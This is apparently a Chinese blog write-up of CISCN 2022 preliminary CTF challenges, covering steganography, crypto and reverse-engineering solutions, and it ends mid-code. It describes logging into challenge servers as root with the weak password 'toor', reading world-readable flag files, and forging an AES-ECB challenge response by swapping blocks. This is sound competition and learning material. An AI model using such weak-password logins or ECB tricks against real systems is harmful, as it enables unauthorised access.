+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220603015734457.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">FB3EFCE4CEAC2F5445C7AE17E3E969AB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>长度32，试了半天最后才知道这个是 md5</p>
+<p>去 <a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a> 解一下，得到 <code>ohhWh04m1</code></p>
+<p>（这个居然 <a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a> 还搜不到，离谱</p>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220603015959610.png"></p>
+<p>图片 alpha2 层右下角有一排隐写</p>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220603020134759.png"></p>
+<p>类似于 LSB，选择 column，导出一下</p>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220603020152958.png"></p>
+<p>得到 <code>f78dcd383f1b5734624b</code></p>
+<p>同时 R0 G0 B0 都很明显存在 LSB 隐写，但是没看出有啥明显的可解密的东西</p>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220603020430671.png"></p>
+<p>最后发现得用 <a target="_blank" rel="noopener" href="https://github.com/livz/cloacked-pixel">cloacked-pixel</a> </p>
+<blockquote>
+<p><strong>cloacked-pixel</strong></p>
+<p>Platform independent Python tool to implement LSB image steganography and a basic detection technique. Features:</p>
+<ul>
+<li>Encrypt data before insertion.</li>
+<li>Embed within LSBs.</li>
+<li>Extract hidden data.</li>
+<li>Basic analysis of images to detect LSB steganography.</li>
+</ul>
+</blockquote>
+<p>将 <code>f78dcd383f1b574b</code> 作为密码进行解密</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ python2 lsb.py extract everlasting_night.png out f78dcd383f1b574b
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Image size: 1920x1080 pixels.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Written extracted data to out.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>得到个 zip，使用 <code>ohhWh04m1</code> 解压得到一个 <code>flag</code> 文件</p>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220603025009548.png"></p>
+<p>看起来是个 png 但是打不开。</p>
+<p>后缀改为 <code>.data</code>，使用 GIMP 修改宽度，最后得到 flag。</p>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220603030725172.png"></p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到电台"><a href="#签到电台" class="headerlink" title="签到电台"></a>签到电台</h3><blockquote>
+<p>题目内容：豪密，是中国共产党和中国工农红军第一本无线电通讯密码的简称，由周恩来同志亲自编制，以周恩来党内化名“伍豪”命名，它是我党建立机要工作最早也是保密性能最强的一种密码，从二十世纪三十年代到全国解放，都始终未被破译。春秋GAME伽玛实验室团队通过对豪密的加密模式进行分析，并参考已有的文献资料，仿制豪密的加密方法，制作成一道题目，谨以此题致敬情报战线的先辈们。</p>
+<p>请点击“下发赛题”，让我们一起穿越百年，追寻红色通信足迹。（关注“春秋伽玛”公众号，回复“签到电台”获取解题提示）</p>
+</blockquote>
+<p>从题目以及微信提示获取明文和密码本，进行模10加法之后得到密文：2847974251850121377742262604</p>
+<p>查看输入密文的网页，是一个模拟摩尔斯电码的电台，随意输入一些.和_，检查网络可以发现实际发送的就是密文，所以直接：</p>
+<p><a target="_blank" rel="noopener" href="http://eci-2ze9sic3tak3xix1s6h3.cloudeci1.ichunqiu.com:8888/send?msg=2847974251850121377742262604">http://eci-2ze9sic3tak3xix1s6h3.cloudeci1.ichunqiu.com:8888/send?msg=2847974251850121377742262604</a></p>
+<p>获取flag</p>
+<h3 id="基于挑战码的双向认证"><a href="#基于挑战码的双向认证" class="headerlink" title="基于挑战码的双向认证"></a>基于挑战码的双向认证</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1qSIAhg3_N9rzR9x7ENlu_w">请先下载说明文档</a> 提取码（GAME）<a target="_blank" rel="noopener" href="https://share.weiyun.com/1XVKV6Xi">备用下载</a></p>
+<p>本题含有两个flag，请点击“下发赛题”，本题容器下发后的端口是ssh端口，ssh的账号密码均为：player；ssh登录上去可自行修改密码。请参考说明文档，获取flag，并在本题提交第一个获取到的flag。</p>
+</blockquote>
+<p>给出的服务器上文件读取权限设置不当（755），可以直接进入root目录下找到 <code>cube-shell/instance/flag_server</code> 中的 flag1.txt 和 flag2.txt。</p>
+<h3 id="基于挑战码的双向认证2"><a href="#基于挑战码的双向认证2" class="headerlink" title="基于挑战码的双向认证2"></a>基于挑战码的双向认证2</h3><p>同上。</p>
+<h3 id="基于挑战码的双向认证3"><a href="#基于挑战码的双向认证3" class="headerlink" title="基于挑战码的双向认证3"></a>基于挑战码的双向认证3</h3><p>给出的服务器上，root用户使用了弱密码（toor），直接登陆后同前两题直接读取即可。</p>
+<p>（所以这三道 crypto 都被非预期了，笑死</p>
+<h3 id="ISO9798"><a href="#ISO9798" class="headerlink" title="ISO9798"></a>ISO9798</h3><p>nc 之后先进行一个SHA256爆破</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
+
+dic<span class="token operator">=</span><span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span>
+result<span class="token operator">=</span><span class="token string">'35d922f11e99a61a0d04ad7e45e4d403dc215857c39f378970d9af07015e39b6'</span>
+known<span class="token operator">=</span><span class="token string">"fGyesK450LYj7f1m"</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> k <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
+            <span class="token keyword">for</span> z <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
+                key<span class="token operator">=</span>i<span class="token operator">+</span>j<span class="token operator">+</span>k<span class="token operator">+</span>z
+                s<span class="token operator">=</span>key <span class="token operator">+</span> known
+                h<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token keyword">if</span> h<span class="token operator">==</span>result<span class="token punctuation">:</span>
+                    <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
+                    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后得到四位XXXX，输入。<br>此时进入正题，要求输入 128 bits 随机数，生成一个即可。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Random <span class="token keyword">import</span> random
+
+bit <span class="token operator">=</span> random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>bit<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>该输入将作为 rB，服务器端会给出一个 rA 和 B，然后生成一个密钥参数 k，使用这些参数进行 AES 加密，其中使用 rA||rB||B 作为明文，得到一个128x3 bits 长的密文串，要求输入明文为 rB||rA 对应的密文。<br>根据题目性质，猜测使用的是 AES-ECB 模式，ECB实际上每一段之间没关系，把之前得到的密文（128x3 bits）的第二段和第一段交换后合并提交即可通过，最后服务器会给出 flag。</p>
+<p>以下是当时给出的真实参数，虽然最后服务器给出的 flag 没有记录，但是在此列出这些参数作为交换并合并这一步的示例，其中 a 为输入的 128 bits rB，b 为 128x3 bits的密文，交换第一、二行后合并提交即可。</p>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/2.png"></p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="baby-tree"><a href="#baby-tree" class="headerlink" title="baby_tree"></a>baby_tree</h3><p>可以看出这是由swift dump出的ast，对着ast一行一行翻译可以得到如下的c++代码：</p>
+<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">bool check(std::string encoded, std::string keyValue)
+{
+    const char *b = encoded.c_str();
+    const char *k = keyValue.c_str();
+    unsigned char r0, r1, r2, r3;
+    for (int i = 0; i &lt; encoded.length() - 4; i++)
+    {
+        r0 = b[i];
+        r1 = b[i + 1];
+        r2 = b[i + 2];
+        r3 = b[i + 3];
+        b[i] = r2 ^ ((k[0] + (r0 &gt;&gt; 4)) &amp; 0xff);
+        b[i + 1] = r3 ^ ((k[1] + (r1 &gt;&gt; 2)) &amp; 0xff);
+        b[i + 2] = r0 ^ k[2];
+        b[i + 3] = r1 ^ k[3];
+        char k0 = k[0];
+        k[0] = k[1];
+        k[1] = k[2];
+        k[2] = k[3];
+        k[3] = k0;
+    }
+    char result[] = {88,35,88,225,7,201,57,94,77,56,75,168,72,218,64,91,16,101,32,207,73,130,74,128,76,201,16,248,41,205,103,84,91,99,79,202,22,131,63,255,20,16}
+    return memcmp(b, result, sizeof(result));
+}
+
+int main(int argc, char *argv[])
+{
+    if (argc &gt;= 2)
+    {
+        std::string data = argv[1];
+        std::string key = "345y";
+        bool result = check(data, key);
+    }
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>因此可以得到解密的代码：</p>
+<pre class="line-numbers language-none"><code class="language-none">r1 = data[i + 3] ^ k[3]
+r0 = data[i + 2] ^ k[2]
+r3 = data[i + 1] ^ ((k[1] + (r1 &gt;&gt; 2)) &amp; 0xff)
+r2 = data[i] ^ ((k[0] + (r0 &gt;&gt; 4)) &amp; 0xff)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>由于k每次循环回做一次轮换，只需要遍历<code>'345y'</code>、<code>'y345'</code>、<code>'5y34'</code>、<code>'45y3'</code>这几个字符串，得出正确的key即可。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">201</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">94</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token punctuation">,</span><span class="token number">168</span><span class="token punctuation">,</span><span class="token number">72</span><span class="token punctuation">,</span><span class="token number">218</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">207</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token number">201</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">248</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">205</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">202</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">]</span>
+k <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'5y34'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+data <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> b<span class="token punctuation">]</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r1 <span class="token operator">=</span> data<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
+    r0 <span class="token operator">=</span> data<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+    r3 <span class="token operator">=</span> data<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span>r1 <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>
+    r2 <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span>r0 <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>
+    <span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>r0<span class="token punctuation">,</span> r1<span class="token punctuation">,</span> r2<span class="token punctuation">,</span> r3<span class="token punctuation">)</span>
+    <span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="babycode"><a href="#babycode" class="headerlink" title="babycode"></a>babycode</h3><p>使用mruby -b -v babycode.mrb即可得到mruby字节码，对着字节码进行分析可以得到功能相近的python代码，很容易发现这是一种xtea加密的变体，写出解密代码即可获得flag。</p>
+<p>分析出的功能相近的python代码以及解密代码如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> struct <span class="token keyword">import</span> unpack
+
+<span class="token keyword">class</span> <span class="token class-name">Crypt</span><span class="token punctuation">:</span>
+    <span class="token keyword">class</span> <span class="token class-name">CIPHER</span><span class="token punctuation">:</span>
+        XX <span class="token operator">=</span> <span class="token number">0x12345678</span>
+        YY <span class="token operator">=</span> <span class="token number">16</span>
+        <span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            cip <span class="token operator">=</span> Crypt<span class="token punctuation">.</span>CIPHER<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> cip<span class="token punctuation">.</span>_encrypt<span class="token punctuation">(</span>t<span class="token punctuation">,</span> p<span class="token punctuation">)</span>
+        <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+            cip <span class="token operator">=</span> Crypt<span class="token punctuation">.</span>CIPHER<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> cip<span class="token punctuation">.</span>_decrypt<span class="token punctuation">(</span>c<span class="token punctuation">,</span> p<span class="token punctuation">)</span>
+        <span class="token keyword">def</span> <span class="token function">_encrypt</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> t<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            key <span class="token operator">=</span> Crypt<span class="token punctuation">.</span>CIPHER<span class="token punctuation">.</span>to_key<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+            c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+            n <span class="token operator">=</span> <span class="token number">0</span>
+            <span class="token keyword">while</span> n <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                num1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span>
+                num1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span>
+                num1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>n <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span>
+                num1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>n <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                num2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>n <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span>
+                num2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>n <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span>
+                num2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>n <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span>
+                num2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>n <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                <span class="token punctuation">(</span>enum1<span class="token punctuation">,</span> enum2<span class="token punctuation">)</span> <span class="token operator">=</span> Crypt<span class="token punctuation">.</span>CIPHER<span class="token punctuation">.</span>enc_one<span class="token punctuation">(</span>num1<span class="token punctuation">,</span> num2<span class="token punctuation">,</span> key<span class="token punctuation">)</span>
+                c<span class="token punctuation">.</span>append<span class="token punctuation">(</span>enum1<span class="token punctuation">)</span>
+                c<span class="token punctuation">.</span>append<span class="token punctuation">(</span>enum2<span class="token punctuation">)</span>
+                n <span class="token operator">+=</span> <span class="token number">8</span>
+            <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token string">'%.8x'</span> <span class="token operator">%</span> x<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">def</span> <span class="token function">_decrypt</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> t<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            key <span class="token operator">=</span> Crypt<span class="token punctuation">.</span>CIPHER<span class="token punctuation">.</span>to_key<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+            dec <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                s <span class="token operator">=</span> Crypt<span class="token punctuation">.</span>CIPHER<span class="token punctuation">.</span>YY <span class="token operator">*</span> Crypt<span class="token punctuation">.</span>CIPHER<span class="token punctuation">.</span>XX
+                y<span class="token punctuation">,</span> z <span class="token operator">=</span> t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>
+                <span class="token keyword">for</span> turn <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>Crypt<span class="token punctuation">.</span>CIPHER<span class="token punctuation">.</span>YY<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                    z <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>y <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> y<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>s <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span>s <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+                    z <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token number">4294967295</span>
+                    s <span class="token operator">-=</span> Crypt<span class="token punctuation">.</span>CIPHER<span class="token punctuation">.</span>XX
+                    y <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>z <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> z<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>s <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s <span class="token operator">&gt;&gt;</span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+                    y <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token number">4294967295</span>
+                dec<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span>
+                dec<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">255</span><span class="token punctuation">)</span>
+                dec<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">255</span><span class="token punctuation">)</span>
+                dec<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y <span class="token operator">&amp;</span> <span class="token number">255</span><span class="token punctuation">)</span>
+                dec<span class="token punctuation">.</span>append<span class="token punctuation">(</span>z <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span>
+                dec<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">255</span><span class="token punctuation">)</span>
+                dec<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">255</span><span class="token punctuation">)</span>
+                dec<span class="token punctuation">.</span>append<span class="token punctuation">(</span>z <span class="token operator">&amp;</span> <span class="token number">255</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> dec
+        <span class="token keyword">def</span> <span class="token function">to_key</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> unpack<span class="token punctuation">(</span><span class="token string">'LLLL'</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">def</span> <span class="token function">enc_one</span><span class="token punctuation">(</span>num1<span class="token punctuation">,</span> num2<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            y <span class="token operator">=</span> num1
+            z <span class="token operator">=</span> num2
+            s <span class="token operator">=</span> <span class="token number">0</span>
